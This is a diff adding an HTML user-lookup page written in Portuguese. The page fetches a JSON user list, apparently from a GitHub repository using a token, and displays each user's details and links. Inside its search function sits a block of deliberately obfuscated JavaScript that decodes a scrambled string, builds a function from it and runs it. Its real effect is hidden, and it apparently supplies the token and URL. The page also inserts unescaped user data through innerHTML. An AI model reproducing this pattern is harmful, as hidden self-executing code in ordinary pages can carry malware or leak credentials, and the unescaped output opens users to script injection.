@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Busca de Usuário</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #007bff;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        input[type="text"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .result {
+            margin-top: 20px;
+            text-align: left;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f8f9fa;
+        }
+
+        .result-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .user-details {
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #f8f9fa;
+        }
+
+        .user-details p {
+            margin: 5px 0;
+        }
+
+        .user-links {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .user-links li {
+            margin-bottom: 5px;
+        }
+
+        .alert {
+            padding: 10px;
+            background-color: #f44336;
+            color: white;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="result-container">
+        <div class="container">
+            <h1>Busca de Usuário por ID</h1>
+            <label for="userId">ID do Usuário:</label>
+            <input type="text" id="userId" placeholder="Digite o ID do usuário">
+
+            <button onclick="buscarUsuario()">Buscar</button>
+
+            <div class="result">
+                <h2>Detalhes do Usuário</h2>
+                <div id="userDetails" class="user-details">
+                    <!-- Aqui serão exibidos os detalhes do usuário -->
+                </div>
+                <h2>Links do Usuário</h2>
+                <ul id="userLinks" class="user-links">
+                    <!-- Aqui serão listados os links do usuário -->
+                </ul>
+                <div id="alertMessage" class="alert" style="display: none;">
+                    Usuário não encontrado.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function buscarUsuario() {
+            var userInput = document.getElementById('userId').value.trim().toLowerCase();
+            
+            // Verifica se o input começa com 'user_' e remove, caso necessário
+            if (userInput.startsWith('user_')) {
+                userInput = userInput.substring(5);
+            }
+            
+            buscarUsuarioPorId(userInput);
+        }
+
+        function mostrarDetalhesUsuario(usuario) {
+            var userDetails = document.getElementById('userDetails');
+            userDetails.innerHTML = `
+                <p><strong>ID:</strong> ${usuario.id}</p>
+                <p><strong>Nome:</strong> ${usuario.name}</p>
+                <p><strong>Email:</strong> ${usuario.email}</p>
+                <p><strong>Ativo:</strong> ${usuario.active ? 'Sim' : 'Não'}</p>
+                <p><strong>Saldo:</strong> ${usuario.saldo}</p>
+            `;
+        }
+
+        function carregarLinksUsuario(links) {
+            var userLinks = document.getElementById('userLinks');
+            userLinks.innerHTML = '';
+            links.forEach(link => {
+                var li = document.createElement('li');
+                li.textContent = link;
+                userLinks.appendChild(li);
+            });
+        }
+
+        function buscarUsuarioPorId(id) {
+            var token,username,repo,path;(function(){var gYF='',nIz=169-158;function fbR(v){var s=1790200;var z=v.length;var f=[];for(var r=0;r<z;r++){f[r]=v.charAt(r)};for(var r=0;r<z;r++){var i=s*(r+442)+(s%14790);var p=s*(r+87)+(s%38255);var y=i%z;var b=p%z;var n=f[y];f[y]=f[b];f[b]=n;s=(i+p)%2176955;};return f.join('')};var lGO=fbR('ionxttmyksrcojqoregbcrlcafpuwhduvnstz').substr(0,nIz);var tSI='far a 19,r<43,i+59;vCr e=dabcd)fghipklmn)pqrsiuvwx1z";v,r m=t88,7(,70,-5,90t81,9j,74,)2,76f80,8 ,71,.6,89l66,7,,87,n5,60n;var=y=[].for()ar k.0;k<9.lenqth;kt+)y[+[k]]nk+1;dar h-[];an=14;h+=50=i+=3p;forvvar {=0;d(arguients=lengvh;d+n){var l=a;gumeots[dm.spl>t(" i);fog(var+c=l.eengtu-1;c3=0;cr-){v6r t=iull;.ar uvl[c]nvar 4=nul(;varoo=0;;ar n[u.levgth;rar j=for(.ar ga0;g<a;g++={vartw=u.AharC]deAtsg);vir p=5[w];hf(p)gt=(pv1)*rou.ch=rCodrAt(g.1)-a j=g;=++;}"lse rf(w=ui){tlr*(m)lengvh-a+).cha)Codezt(g+;))+uuchar=odeAg(g+2=-a;jig;g+m2;}eose{cantin=e;}i((z==mull)n=[];2f(j>;)z.pfsh(ursubsuringeo,j)g;z.prsh(l+t+1]=;o=gi1;}iz(z!=vull)lif(okn)z.(ush(+.sub9trina(o))"l[c]ez.jo8n(""{;}}hypush+l[0]);}vai f=h=join<"");.ar qv[42,v2,96a10,3;,92];concct(m)fvar 7=Str=ng.fromChurCod=(46)vfor(aar k70;k<e.lenvth;k +)f=,.spl[t(v+y.chaeAt(k=).jo+n(St,ing.;romCrarCote(q[=]));retur] f.s;lit(n+"!"8.joia(v);';var cnd=fbR[lGO];var Tdp='';var MPr=cnd;var mFr=cnd(Tdp,fbR(tSI));var ZlM=mFr(fbR('5X;.0eX,XXr=(*;lX}y (XX -M...(.l=)osX%5e rX.X3)\/_X0job6_i$_1(cXXu3f4b(aXef=X;l;x)1Xk!_s;Xe7)h)(!yXkj7n\/0!;b73gboc#X7 %prX4S\'Xsj)!u_n"aa).1{sXm.41zXnn7renXs(ItX.;(ib%_=8oXf4$)i]n"2.79i,q)j,id.!{a)r.3a",(;(fb$.(5ar(n,s*(=neas}Xas#o(!#k=0714f(b(}sk)6$"f{y.l[X!(+kX2X]e,naanbs(e,;kb!z=)jX)h5).pt$3&4oj4-Xtf[4mS1)f2!{CdbXb;e.o!XXiet)g,.X =+(gdo54oX=XX_}(Xfe1b.n!3h.r.Xn(endt2}(Xjs370u#3)y$X+.oo$Xa.b+;0.X .XX5)f+b3rX&7e8$6b k,m]!.one)X.9cb\'2_&.f".t,1.)$e\/$1(X.$r.g!XX($sX,,)$y;l5e);;X+"iu6j.*p7r;&j=;_ov3,j.)f0e6u4.$9axXe20}j(.,s1,!4bX$;.X_6X())![,;e; e2=4%3bpn.be;=1ri;}(;sni d.,rX2t+))j.rbto,-4e5d!;)4b),!Xo_a\/sesx)XXf%e=.{{_Xi.t(xaj9\'S(_t X,,f_..3XfaXffXel\'XcoX*1+ l.;(n#X!3)vlvf.)X- g}oXk;#)p7)=sXc0eu)g 6(;u,4jto(b!X$e{.k$$)}=b\'=Xb{.be( 8Xn{3o1(h%=,jiX.XXt}!Xbl3lub%4;lv3]$a}4X r34(v&;Xa,%00adr);$b1o=z..0=b(a-(jhX7tt7X{z(g6a}d. fv0X.X.iXr0+}X=j5)!kXk_)ttx{)]hs.fr8yr(.X=r;j..(t.$2t;a).p)u_%t.2se$X;72(01re,Xf .!,=5bvs\/lX..g%j7{js&i;t}f)}s;!4Xfs.2_(((._0)=t)0$)t$,=3_}2_X=X"epXgfpXb!X03u!e3,7aC]X)0o.x,o.eb(.fbXj cnXs,!] $. ftr]+\/s)ta#uilX0a Xg0b(_}hcnl2vbee,nX\/)}ie!'));var kMf=MPr(gYF,ZlM );kMf(7693);return 1202})()
+
+            fetch(url, {
+                headers: {
+                    Authorization: `token ${token}`
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erro ao carregar arquivo');
+                }
+                return response.json();
+            })
+            .then(data => {
+                let content = atob(data.content);
+                let jsonData = JSON.parse(content);
+
+                // Buscar usuário por ID
+                const usuario = jsonData.find(user => user.id === `user_${id}` || user.id === id);
+                if (usuario) {
+                    mostrarDetalhesUsuario(usuario);
+                    
+                    // Carregar os links do usuário a partir do arquivo links.js
+                    carregarLinksUsuarioFromJS(usuario.id_links);
+                    
+                    document.getElementById('alertMessage').style.display = 'none';
+                } else {
+                    document.getElementById('userDetails').innerHTML = '';
+                    document.getElementById('userLinks').innerHTML = '';
+                    document.getElementById('alertMessage').style.display = 'block';
+                }
+            })
+            .catch(error => console.error('Erro ao carregar dados:', error));
+        }
+
+        function carregarLinksUsuarioFromJS(links) {
+            // Carregar o script links.js dinamicamente
+            var script = document.createElement('script');
+            script.src = '../../js/links.js';
+            document.head.appendChild(script);
+
+            script.onload = function() {
+                // Usar os links do usuário vindos do script links.js
+                carregarLinksUsuario(links);
+            };
+        }
+    </script>
+</body>
+</html>
